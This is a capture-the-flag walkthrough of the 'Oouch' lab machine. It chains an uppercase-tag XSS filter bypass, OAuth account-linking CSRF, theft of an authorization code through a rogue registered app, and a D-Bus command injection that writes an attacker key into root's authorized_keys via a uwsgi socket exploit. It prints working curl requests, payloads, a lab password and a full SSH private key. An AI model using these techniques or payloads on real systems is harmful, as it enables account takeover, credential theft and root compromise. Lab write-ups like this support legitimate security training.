# User

## nmap

```nmap
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest:
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions:
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=4/13%Time=5E94FABE%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP Server

Anonymous login provides us with a project.txt file that contains

```
Flask -> Consumer
Django -> Authorization Server
```

## consumer.oouch.htb:5000

Running dirbuster give an `/oauth` route. Navigating to it shows a hidden developer page. With links to `consumer.oouch.htb:5000/oauth/connect`(for connecting an authorization account) and `consumer.oouch.htb:5000/oauth/login`(for logging in with an authorization account). When visiting one we get a redirect to `authorization.oouch.htb:8000`. Adding this to `/etc/hosts` we can access the http server on 8000.

Entering a `<script>` tag into the contact form shows an error about hackers. However, shifting to uppercase works. Inserting an `<IMG src=http://10.10.14.21/>` results in a request to a local http server.

## authorization.oouch.htb:8000

Is an http server that returns a 400 bad request response.

```
HTTP/1.1 400 Bad Request
Content-Type: text/html
Vary: Authorization
Transfer-Encoding: chunked
```

Setting the host to `authorization.oouch.htb` we get

```
Oouch - The Simple and Secure Authorization Server
Oouch is a simple authorization server based on the Oauth2 protocol. Instead of managing credentials for multiple applications, just create an Oouch account and use it for login on supported applications. Our platform provides maximum comfort and conforms to the highest security standards.

You have not signed it yet. Please choose between the following options:

Login at: login

Or signup for a new account: register

Notice: For registration we are asking you for SSH credentials to your Oouch orchestration server. This is only required if you want to use the Oouch orchestration application. Since this one is currently under development, you want most likely to ignore the SSH related fields inside of the registration form.
```

The routes allow for creating an account and linking accounts on consumer to it.

## Gaining admin access

Utilizing both consumer and authorization servers we can gain admin access. First we use the authorization server to generate a token URL on consumer for an account we own. We can then use the redirect URL in the POST response in an XSS request in the contact form on consumer. This links the admin's account to our oauth account. The request to generate the token looks like

```sh
curl -i -s -k -X $'POST' -H $'Host: authorization.oouch.htb:8000' \
 -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' \
 -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' \
 -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 266' -H $'Connection: close' -H $'Cookie: csrftoken=eT92X9ptc6HqDzGauRpdHIYJO8pQsWMhvLaJMojVVBLBOQ30tUhJ4EstbWsd41AU; sessionid=u52kd916vhfolhq347cbnongqbawgxzp' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'csrftoken=eT92X9ptc6HqDzGauRpdHIYJO8pQsWMhvLaJMojVVBLBOQ30tUhJ4EstbWsd41AU; sessionid=u52kd916vhfolhq347cbnongqbawgxzp' \
    --data-binary $'csrfmiddlewaretoken=9M7DVHPxUcocVdZUEUHrna1v3Qep4rr2DRXboBl66N6v6ftVZ4VkvPD0HhCmqKsT&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize' \
    $'http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read'
```

The XSS payload utilizes the response to the above and looks like

```html
<IMG
SRC=http://consumer.oouch.htb:5000/oauth/connect/token?code=ufKYchGJjE4TLCm3QMTUxsmPabaMrj>
```

## Admin Account

Navigating to `/documents` shows the following:

`Hello qtc! You have currently following documents stored:`
| | |
|-|-|
| `dev_access.txt` | develop:supermegasecureklarabubu123! -> Allows application registration. |
| `o_auth_notes.txt` | /api/get_user -> user data. oauth/authorize -> Now also supports GET method |
| `todo.txt` | Chris mentioned all users could obtain my ssh key. Must be a joke... |

Navigating to `/profile` yields:

|                       |                        |
| --------------------- | ---------------------- |
| `Username:`           | qtc                    |
| `Email:`              | qtc@nonexistend.nonono |
| `Connected-Accounts:` | admin.                 |

## Dev Access to Application Registration

Accessing `authorization.oouch.htb:8000/oauth/applications/register` with the credentials in `dev_access.txt` gives a form with the following options:

```
Name
Client id
Client secret
Client type
Authorization grant type -
Redirect uris
```

Saving an application with the following information

```
Name - Malicious App
Client id - client-id
Client secret - client-secret
Client type -  Public
Authorization grant type - Authorization-code
Redirect uris - 10.10.14.39/oauth
```

results in a redirect to
http://authorization.oouch.htb:8000/oauth/applications/2/

Appending `/update/` allows updating, and `/delete/` allows deletion.

## Owning User

We need to connect the qtc user's authorization account to our app so we can then grab an access token to access the `/api/get_ssh` url. This works because we can do a GET request to the authorize We send the following to the `qtc` user via the contact form:

`<IMG SRC=http://authorization.oouch.htb:8000/oauth/authorize/?client_id=client-id&response_type=code&redirect_uri=http://10.10.14.39/oauth&scope=read&allow=Authorize>`

If done properly you should get an authorization code sent to your local http server via the redirect. It'll be in the query string `/oauth?code=eJqQc7vV6yfAioAV3vCYwqOIuKW4Cu`. Use the authorization code to get an access token via:

`curl -v -i -s -k -X $'POST' -H $'Host: authorization.oouch.htb:8000' -b 'sessionid:"8d56jz86kdaloyhjdszoyro28lo0a5io"' --data-binary $'client_id=client-id&client_secret=client-secret&grant_type=authorization_code&code=eJqQc7vV6yfAioAV3vCYwqOIuKW4Cu' $'http://authorization.oouch.htb:8000/oauth/token/'`

It will return some JSON

`{"access_token": "DTEzpX7KJZzE5a0gYyCC0XRbsbpRTR", "expires_in": 600, "token_type": "Bearer", "scope": "read", "refresh_token": "Kbwlc9eRebqQTJJwCfACiLbrek875K"}`

Drop the access token into the authorization header on a request to `/api/get_ssh`:

`curl -v 'http://authorization.oouch.htb:8000/api/get_ssh' -b 'csrftoken=K29afWPya1KWjnEE07UrunmFerakHrsnMT4MUdTDdWcKfGI3rPHx8ZD9yBNx29wD; sessionid=8d56jz86kdaloyhjdszoyro28lo0a5io' -H 'Authorization: Bearer DTEzpX7KJZzE5a0gYyCC0XRbsbpRTR'`

It'll return JSON with the qtc user's ssh key:

```
{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1...rZXkWxpAQIDBA==\n-----END OPENSSH PRIVATE KEY-----"}
```

Pull the ssh key out of the JSON

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

# Root

There's a `.note.txt` file in the qtc home directory with the following contents:

`Implementing an IPS using DBus and iptables == Genius?`

Interesting stuff from `pspy64s`

```
2020/05/03 06:48:53 CMD: UID=33   PID=26857  | uwsgi --ini uwsgi.ini --chmod-sock=666
2020/05/03 06:48:53 CMD: UID=33   PID=26858  | python /home/qtc/send-dbus.py
2020/05/03 06:48:53 CMD: UID=0    PID=26860  | sh -c iptables -A PREROUTING -s 10.10.10.10 -t mangle -j DROP
2020/05/03 06:48:53 CMD: UID=0    PID=26859  | /root/dbus-server
```

There's an interesting config file `/etc/dbus-1/system.d/htb.oouch.Block.conf`

```
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>
```

Doing some more enum we find that port 22 is open on the consumer docker container(172.18.0.5). You can ssh into it. There is a `/code` directory that looks interesting. The following code in routes.py is interesting:

```python
# First apply our primitive xss filter
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
```

It looks to make an RPC via dbus to block a certain IP. The `/root/dbus-server` looks to be picking up the request and making a command line call to iptables. You can see it via `pspy`. We need to perform the RPC as `www-data` as specified in the config. If we can change the value in the block call we might be able to do command injection. Doing some enum we find an exploit for uwsgi. The socket is world writeable and we can use an exploit found on github(`uwsgi-exploit.py`) that allows us to run the command as `www-data`. We can create a file `send-dbus.py` to do the command injection, adding our SSH key to root's authorized_keys file:

```python
import sys
sys.path.insert(0, "/usr/lib/python3/dist-packages")
import dbus

bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
block_iface.Block("10.10.10.10; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWk1w20sjujx1eEoYGnaBfAaQ2ubbXj5s1BHG4DyImRygZTk7nNkHNn8one89foL0Igv1sQnCN4G7uqPVcYNgB6yzCEOIn9sSqCJN+VarQexc8VzoagiOq8PTMQSRlfmdh4p7sl7IkMw6KWfl1DAm/XTgeW239KQu3v9gSV0nrmn23Fdm0BbBFgMhIKq6/LUlqP10JbsfLVkJD+9NlE9y/sv7EomhqWDkZvGUpAg8mDRC8Z25zk8EOyce5y5fDaKKeWjqqnERDeatWN4WXw50uSoyECavY7VezVLHD62vNVwqCOtAUtk4r2rciKe7Pr6YHWOhb3bROtvmLX5ZbBxCUXeRXQfENVhT8xMZpxJeCdyvl4jTLRTC2BEoUY75ae2P+AmKFZiLFJYZUO2selPRlZsTh3rpPxrsADn7fN04BmdZndvAapNSUJacq2MDXZ0VkG/Ij4og8NN5SykVr7Swj9OKUbY3B0XtWVWxDietHqj7epagHMtIAQWsUBA05w88= zoey@nomadic' >> /root/.ssh/authorized_keys; echo");
bus.close()
```

Then we use the exploit to run it under the `www-data` user account:

`python uwsgi-exploit.py -m unix -u /tmp/uwsgi.socket -c 'python /home/qtc/send-dbus.py'`

Watch the calls go through in `pspy` and then ssh into root and grab the flag.
